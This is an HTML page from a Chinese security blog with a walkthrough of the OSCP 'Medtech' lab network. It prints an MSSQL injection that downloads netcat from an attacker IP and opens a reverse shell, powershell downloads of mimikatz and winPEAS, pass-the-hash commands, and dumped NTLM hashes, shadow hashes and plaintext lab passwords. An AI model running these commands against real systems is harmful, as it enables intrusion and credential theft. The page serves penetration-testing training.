@@ -1,0 +1,481 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>OSCP-Medtech | CXAQHQ</title>
+<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="OSCP-Medtech | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+
+Sqlmap GetShell
+
+下载Nc 反弹Shell
+admin';EXEC master..xp_cmdshell 'powershell wget http://192.168.45.224:88/shell/nc.exe -..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.cxaqhq.cn">
+  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/badboycxcc" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/cxaqhq" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              OSCP-Medtech
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-04-25
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <figure data-type="image" tabindex="1"><img src="https://blog.cxaqhq.cn/post-images/1682596401455.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://blog.cxaqhq.cn/post-images/1686910007685.jpeg" alt="" loading="lazy"></figure>
+<h2 id="sqlmap-getshell">Sqlmap GetShell</h2>
+<figure data-type="image" tabindex="3"><img src="https://blog.cxaqhq.cn/post-images/1682594450121.jpg" alt="" loading="lazy"></figure>
+<h2 id="下载nc-反弹shell">下载Nc 反弹Shell</h2>
+<pre><code>admin';EXEC master..xp_cmdshell 'powershell wget http://192.168.45.224:88/shell/nc.exe -outfile c:\windows\temp\nc.exe'--
+
+powershell wget http://1.1.1.1/nc.exe -outfile c:\windows\temp\nc.exe
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://blog.cxaqhq.cn/post-images/1682594490296.jpg" alt="" loading="lazy"></figure>
+<pre><code>admin';EXEC master..xp_cmdshell 'c:\windows\temp\nc.exe 192.168.45.224 1337 -e cmd'---
+
+c:\windows\temp\nc.exe 1.1.1.1 1337 -e cmd
+</code></pre>
+<h2 id="信息收集">信息收集</h2>
+<p>写一句话密码权限不足<br>
+<img src="https://blog.cxaqhq.cn/post-images/1682594544739.jpg" alt="" loading="lazy"></p>
+<p>MSSQL 密码</p>
+<pre><code>c:\inetpub\wwwroot&gt;type web.config
+type web.config
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+    &lt;system.web&gt;
+&lt;!--            &lt;customErrors mode=&quot;On&quot;&gt;
+                &lt;error statusCode=&quot;500&quot; redirect=&quot;error.aspx&quot;/&gt;
+                        &lt;error statusCode=&quot;404&quot; redirect=&quot;error.aspx&quot;/&gt;
+                &lt;/customErrors&gt; --&gt;
+    &lt;customErrors mode=&quot;RemoteOnly&quot; /&gt;
+                &lt;compilation debug=&quot;true&quot; targetFramework=&quot;4.0&quot;&gt;
+                        &lt;assemblies&gt;
+                                &lt;add assembly=&quot;System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A&quot; /&gt;
+                                &lt;add assembly=&quot;System.DirectoryServices.AccountManagement, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089&quot; /&gt;
+                                &lt;add assembly=&quot;System.DirectoryServices.Protocols, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A&quot; /&gt;
+                        &lt;/assemblies&gt;
+                &lt;/compilation&gt;
+        &lt;/system.web&gt;
+        &lt;system.webServer&gt;
+        &lt;defaultDocument&gt;
+            &lt;files&gt;
+                &lt;clear /&gt;
+                &lt;add value=&quot;index.html&quot; /&gt;
+                &lt;add value=&quot;index.htm&quot; /&gt;
+                &lt;add value=&quot;default.aspx&quot; /&gt;
+            &lt;/files&gt;
+        &lt;/defaultDocument&gt;
+    &lt;/system.webServer&gt;
+        &lt;connectionStrings&gt;
+                &lt;add name=&quot;myConnectionString&quot; connectionString=&quot;server=localhost\SQLEXPRESS;database=webapp;uid=sa;password=WhileChirpTuesday218;Trusted_Connection=False;MultipleActiveResultSets=true; Integrated Security=False; Max Pool Size=500;&quot; /&gt;
+        &lt;/connectionStrings&gt;
+&lt;/configuration&gt;
+</code></pre>
+<p>用户名<br>
+<img src="https://blog.cxaqhq.cn/post-images/1682594603857.jpg" alt="" loading="lazy"></p>
+<p>IP信息<br>
+<img src="https://blog.cxaqhq.cn/post-images/1682594613979.jpg" alt="" loading="lazy"></p>
+<p>系统信息<br>
+<img src="https://blog.cxaqhq.cn/post-images/1682594626682.jpg" alt="" loading="lazy"></p>
+<p>定位域控<br>
+<img src="https://blog.cxaqhq.cn/post-images/1682594636708.jpg" alt="" loading="lazy"></p>
+<h3 id="user">User</h3>
+<pre><code>Administrator
+Guest
+joe
+krbtgt
+leon
+mario
+offsec
+peach
+wario
+yoshi
+</code></pre>
+<h3 id="pass">Pass</h3>
+<pre><code>Flowers1
+lab
+point145dream
+WhileChirpTuesday218
+
+</code></pre>
+<h2 id="badpotato-提权拿下web01-121">BadPotato 提权拿下WEB01  121</h2>
+<figure data-type="image" tabindex="5"><img src="https://blog.cxaqhq.cn/post-images/1683371001204.jpeg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://blog.cxaqhq.cn/post-images/1683371008712.jpeg" alt="" loading="lazy"></figure>
+<h2 id="拿下files02-11">拿下FILES02 11</h2>
+<h3 id="impcaket">Impcaket</h3>
+<p><img src="https://blog.cxaqhq.cn/post-images/1683371105573.png" alt="" loading="lazy"><br>
+<img src="https://blog.cxaqhq.cn/post-images/1683371114909.png" alt="" loading="lazy"></p>
+<h3 id="crackmapexec">crackmapexec</h3>
+<p><img src="https://blog.cxaqhq.cn/post-images/1684827666099.png" alt="" loading="lazy"><br>
+<img src="https://blog.cxaqhq.cn/post-images/1684827992435.png" alt="" loading="lazy"></p>
+<h3 id="信息收集找到ntlm">信息收集，找到NTLM</h3>
+<pre><code>type fileMonitorBackup.log | findstr NTLM
+   88934 Oct 04 11:21  Backup      daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e 
+   88605 Oct 04 11:21  Backup      toad                         6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068                                                                                    
+   88137 Oct 04 11:21  Backup      wario                        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e          Mushroom!                                                                                                            
+   87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://blog.cxaqhq.cn/post-images/1684828161011.png" alt="" loading="lazy"></figure>
+<h2 id="拿下client02-83">拿下CLIENT02  83</h2>
+<pre><code>proxychains4  crackmapexec winrm  172.16.192.1/24 -u wario -H fdf36048c1cf88f5630381c5e38feb8e -x &quot;whoami&quot;
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://blog.cxaqhq.cn/post-images/1684828661239.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://blog.cxaqhq.cn/post-images/1684829171321.png" alt="" loading="lazy"></figure>
+<h3 id="提权">提权</h3>
+<p><img src="https://blog.cxaqhq.cn/post-images/1684831435170.png" alt="" loading="lazy"><br>
+<img src="https://blog.cxaqhq.cn/post-images/1684831838280.png" alt="" loading="lazy"><br>
+<img src="https://blog.cxaqhq.cn/post-images/1684831800564.png" alt="" loading="lazy"></p>
+<pre><code>------------------- Hashdump passwords -----------------
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:00fd074ec24fd70c76727ee9b2d7aacd:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9d5595c1747195754bbeb7969c357801:::
+offsec:1001:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+
+------------------- Pypykatz passwords -----------------
+
+[+] Shahash found !!!
+Shahash: 8a2930d3a4a9620468d85825d4f35fac3502ce4d
+Nthash: ca89c858303e929cb7b6b65c3453dae8
+Login: CLIENT02$
+
+</code></pre>
+<h2 id="拿下vpn-122">拿下VPN 122</h2>
+<h3 id="ssh爆破">SSH爆破</h3>
+<pre><code>offsec
+password
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://blog.cxaqhq.cn/post-images/1686113892580.png" alt="" loading="lazy"></figure>
+<h3 id="提权-2">提权</h3>
+<p>根据提示查看所有命令，查看历史命令并执行，提权成功<br>
+<img src="https://blog.cxaqhq.cn/post-images/1686113963381.png" alt="" loading="lazy"></p>
+<h3 id="拿下-prooftxt">拿下 proof.txt</h3>
+<figure data-type="image" tabindex="11"><img src="https://blog.cxaqhq.cn/post-images/1686113985758.png" alt="" loading="lazy"></figure>
+<h3 id="信息收集-2">信息收集</h3>
+<p>可疑进程<br>
+<img src="https://blog.cxaqhq.cn/post-images/1686114294406.png" alt="" loading="lazy"></p>
+<pre><code># cat /root/scripts/.startup.py
+import os
+import time
+
+if __name__ == '__main__':
+    os.chdir('/etc/openvpn/server/')
+    os.system('openvpn /etc/openvpn/server/server_mini.conf')
+
+
+# 
+
+# cat /etc/openvpn/server/server_mini.conf
+dev tun
+proto tcp-server
+secret static.key
+
+</code></pre>
+<pre><code># cat /etc/shadow
+root:$y$j9T$2pGfmLZ2kv0OMN7xs1QG21$6NibMN8YIZ794SpXXu9g3DMMJIZr95EFRVcs7xUs568:19268:0:99999:7:::
+offsec:$y$j9T$cz8KelZ70XBw8aW0yGHDM1$dGUNrLYSuRA9Nzj4KGBF7dzCvQOZkO5lY.2fM2yjan3:19424:0:99999:7:::
+mario:$y$j9T$WlF.5NfkOQ2xN4K9OPM2e1$X/wrPHU0zaz.dGUjFQGLj5nbrTfNpy0Hm6Xev04aUw8:19268:0:99999:7:::
+
+</code></pre>
+<h2 id="拿下14">拿下14</h2>
+<h3 id="找到ssh私钥">找到SSH私钥</h3>
+<p>直接ssh连接</p>
+<pre><code>ssh -i id_rsa mario@172.16.218.14
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://blog.cxaqhq.cn/post-images/1686649461777.png" alt="" loading="lazy"></figure>
+<h2 id="拿下client01-82">拿下CLIENT01  82</h2>
+<h3 id="使用rdp登陆成功">使用RDP登陆成功</h3>
+<pre><code>proxychains4 xfreerdp /v:172.16.218.82:3389 /u:yoshi /p:Mushroom!
+</code></pre>
+<p>直接管理员权限<br>
+<img src="https://blog.cxaqhq.cn/post-images/1686654921996.png" alt="" loading="lazy"></p>
+<h3 id="获取prooftxt">获取proof.txt</h3>
+<figure data-type="image" tabindex="13"><img src="https://blog.cxaqhq.cn/post-images/1686655088250.png" alt="" loading="lazy"></figure>
+<p>Mimikatz 没抓到什么有用信息，使用自制文件搜索工具查询，发现目标文件<br>
+<img src="https://blog.cxaqhq.cn/post-images/1686655019194.png" alt="" loading="lazy"></p>
+<pre><code>C:\Users\yoshi\Downloads&gt;type C:\users\Administrator.MEDTECH\Searches\hole.txt
+type C:\users\Administrator.MEDTECH\Searches\hole.txt
+leon:rabbit!:)
+</code></pre>
+<h2 id="拿下dev04-12">拿下DEV04 12</h2>
+<pre><code>proxychains4 xfreerdp /v:172.16.218.12:3389 /u:yoshi /p:Mushroom!
+</code></pre>
+<p>Mimikatz 抓密码，发现len账号密码</p>
+<pre><code>Authentication Id : 0 ; 363938 (00000000:00058da2)
+Session           : Interactive from 1
+User Name         : leon
+Domain            : MEDTECH
+Logon Server      : DC01
+Logon Time        : 6/10/2023 9:30:34 AM
+SID               : S-1-5-21-976142013-3766213998-138799841-1105
+        msv :
+         [00000003] Primary
+         * Username : leon
+         * Domain   : MEDTECH
+         * NTLM     : 2e208ad146efda5bc44869025e06544a
+         * SHA1     : 8d1c9e13d2d2c20dbee8b4eacb20b73f06573c96
+         * DPAPI    : a7bad14f64c3cf0d7ae2b5f6392a0b6d
+        tspkg :
+        wdigest :
+         * Username : leon
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : leon
+         * Domain   : MEDTECH.COM
+         * Password : rabbit:)
+</code></pre>
+<h3 id="登陆域控">登陆域控</h3>
+<p>发现新信息<br>
+<img src="https://blog.cxaqhq.cn/post-images/1686790774885.png" alt="" loading="lazy"></p>
+<h2 id="拿下120">拿下120</h2>
+<h3 id="收集账号密码进行ssh爆破或者根据收集信息">收集账号密码进行SSH爆破或者根据收集信息</h3>
+<figure data-type="image" tabindex="14"><img src="https://blog.cxaqhq.cn/post-images/1686876938007.png" alt="" loading="lazy"></figure>
+<p>powershell wget http://192.168.45.190:88/getpassword/mimi_64/mimikatz.exe -outfile c:\m.exe</p>
+<p>m.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit &gt; hash.txt</p>
+<p>powershell wget http://192.168.45.190:88/CheckUserFileAll.exe -outfile c:\CheckUserFileAll.exe</p>
+<p>powershell wget http://192.168.45.190:88/privilege/windows/winPEASx64.exe -outfile c:\winPEASx64.exe</p>
+<h2 id="10">10</h2>
+<figure data-type="image" tabindex="15"><img src="https://blog.cxaqhq.cn/post-images/1686906874114.png" alt="" loading="lazy"></figure>
+<p>域控Hash Dump<br>
+<img src="https://blog.cxaqhq.cn/post-images/1686876282015.png" alt="" loading="lazy"></p>
+<h2 id="11">11</h2>
+<figure data-type="image" tabindex="16"><img src="https://blog.cxaqhq.cn/post-images/1686876298871.png" alt="" loading="lazy"></figure>
+<h2 id="12">12</h2>
+<figure data-type="image" tabindex="17"><img src="https://blog.cxaqhq.cn/post-images/1686876308504.png" alt="" loading="lazy"></figure>
+<h2 id="13">13</h2>
+<figure data-type="image" tabindex="18"><img src="https://blog.cxaqhq.cn/post-images/1686906857137.png" alt="" loading="lazy"></figure>
+<h2 id="14">14</h2>
+<figure data-type="image" tabindex="19"><img src="https://blog.cxaqhq.cn/post-images/1686879940102.png" alt="" loading="lazy"></figure>
+<h2 id="82">82</h2>
+<figure data-type="image" tabindex="20"><img src="https://blog.cxaqhq.cn/post-images/1686876337155.png" alt="" loading="lazy"></figure>
+<h2 id="83">83</h2>
+<figure data-type="image" tabindex="21"><img src="https://blog.cxaqhq.cn/post-images/1686876356581.png" alt="" loading="lazy"></figure>
+<h2 id="120">120</h2>
+<figure data-type="image" tabindex="22"><img src="https://blog.cxaqhq.cn/post-images/1686876589564.png" alt="" loading="lazy"></figure>
+<h2 id="121">121</h2>
+<figure data-type="image" tabindex="23"><img src="https://blog.cxaqhq.cn/post-images/1686876603920.png" alt="" loading="lazy"></figure>
+<h2 id="122">122</h2>
+<figure data-type="image" tabindex="24"><img src="https://blog.cxaqhq.cn/post-images/1686879646187.png" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#sqlmap-getshell">Sqlmap GetShell</a></li>
+<li><a href="#%E4%B8%8B%E8%BD%BDnc-%E5%8F%8D%E5%BC%B9shell">下载Nc 反弹Shell</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#user">User</a></li>
+<li><a href="#pass">Pass</a></li>
+</ul>
+</li>
+<li><a href="#badpotato-%E6%8F%90%E6%9D%83%E6%8B%BF%E4%B8%8Bweb01-121">BadPotato 提权拿下WEB01  121</a></li>
+<li><a href="#%E6%8B%BF%E4%B8%8Bfiles02-11">拿下FILES02 11</a>
+<ul>
+<li><a href="#impcaket">Impcaket</a></li>
+<li><a href="#crackmapexec">crackmapexec</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%BE%E5%88%B0ntlm">信息收集，找到NTLM</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8B%BF%E4%B8%8Bclient02-83">拿下CLIENT02  83</a>
+<ul>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8B%BF%E4%B8%8Bvpn-122">拿下VPN 122</a>
+<ul>
+<li><a href="#ssh%E7%88%86%E7%A0%B4">SSH爆破</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83-2">提权</a></li>
+<li><a href="#%E6%8B%BF%E4%B8%8B-prooftxt">拿下 proof.txt</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2">信息收集</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8B%BF%E4%B8%8B14">拿下14</a>
+<ul>
+<li><a href="#%E6%89%BE%E5%88%B0ssh%E7%A7%81%E9%92%A5">找到SSH私钥</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8B%BF%E4%B8%8Bclient01-82">拿下CLIENT01  82</a>
+<ul>
+<li><a href="#%E4%BD%BF%E7%94%A8rdp%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F">使用RDP登陆成功</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96prooftxt">获取proof.txt</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8B%BF%E4%B8%8Bdev04-12">拿下DEV04 12</a>
+<ul>
+<li><a href="#%E7%99%BB%E9%99%86%E5%9F%9F%E6%8E%A7">登陆域控</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8B%BF%E4%B8%8B120">拿下120</a>
+<ul>
+<li><a href="#%E6%94%B6%E9%9B%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8Cssh%E7%88%86%E7%A0%B4%E6%88%96%E8%80%85%E6%A0%B9%E6%8D%AE%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF">收集账号密码进行SSH爆破或者根据收集信息</a></li>
+</ul>
+</li>
+<li><a href="#10">10</a></li>
+<li><a href="#11">11</a></li>
+<li><a href="#12">12</a></li>
+<li><a href="#13">13</a></li>
+<li><a href="#14">14</a></li>
+<li><a href="#82">82</a></li>
+<li><a href="#83">83</a></li>
+<li><a href="#120">120</a></li>
+<li><a href="#121">121</a></li>
+<li><a href="#122">122</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.cxaqhq.cn/post/oscp-relia/">
+              <h3 class="post-title">
+                OSCP-Relia
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
